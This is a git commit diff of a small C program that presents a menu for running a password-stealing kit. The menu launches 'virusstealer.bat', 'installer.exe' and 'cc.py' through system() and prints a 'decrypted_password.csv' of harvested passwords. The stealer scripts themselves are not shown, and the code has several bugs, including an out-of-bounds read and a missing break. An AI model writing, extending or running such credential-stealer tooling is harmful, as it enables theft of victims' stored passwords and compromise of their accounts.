c5e3e50f252d28b3a139b50125bbbdea17e85dcc
Sniper12356 <116349605+Sniper12356@users.noreply.github.com>
2024-06-09 22:50:47 +0530

    Update yay yay.c

--- yay yay.c
+++ yay yay.c
@@ -1,40 +1,54 @@
+
 #include <stdio.h>
-#include <stdlib.h>
+#include <stdlib.h> 
+#include <string.h>
 
-int main () {
-    printf ("Does your computer has python?(y/n)\n");
-
-    char option[2];
-    scanf ("%s", option);
-
-    switch (option[2]) {
-        case 'y' : ; 
-         char* batchfile = "virusstealer.bat";
-         system (batchfile);
-         printf ("Current Passwords will be saved in decrypted_passwords.csv, opening that file in notepad.");
-
-    break;
-
-       case 'n' : ;
-       char* executable_path = "installer.exe";
-        system(executable_path)
-       int return_value = system(executable_path);
-       if (return_value == 0) {
-        printf("Executable was executed successfully.\n");
-    } 
-    else {
-        printf("Failed to execute the executable.\n");
+// Function to open a file and display its contents
+void openFile() {
+    FILE *file = fopen("decrypted_password.csv", "r");
+    if (file != NULL) {
+        char line[1000000];
+        while (fgets(line, sizeof(line), file)) {
+            printf("%s", line);
+        }
+        fclose(file);
+    } else {
+        printf("Error opening file.\n");
     }
-    break;
+}
 
-    default : printf ("Picked the wrong option; Options are: Y for YES, N for NO.");
+// Function to run a batch file
+void runBatchFile() {
+    system("virusstealer.bat");
+}
+void runInstaller() {
+    system("installer.exe");
+}
+void runPrinter() { 
+    system("cc.py");
+}
+int main() {
+    int choice;
+    printf("Choose an option:\n");
+    printf("1. Open current passwords stored.\n");
+    printf("2. Run Stealer File\n");
+    printf("3. Check passwords on this computer\n");
+    scanf("%d", &choice);
 
+    switch (choice) {
+        case 1:
+            openFile();
+            break;
+        case 2:
+            runBatchFile();
+            break;
+        case 3:
+            runPrinter();
+        default:
+            printf("Invalid choice.\n");
+            break;
     }
-        char opt[2];
-    scanf ("%s", opt);
-    char* batchfile = "virusstealer.bat";
-    system (batchfile);
-   //exit code
+     //exit code
     printf ("Press any key to exit...\n");
     char exit[2];
     scanf ("%s", exit);
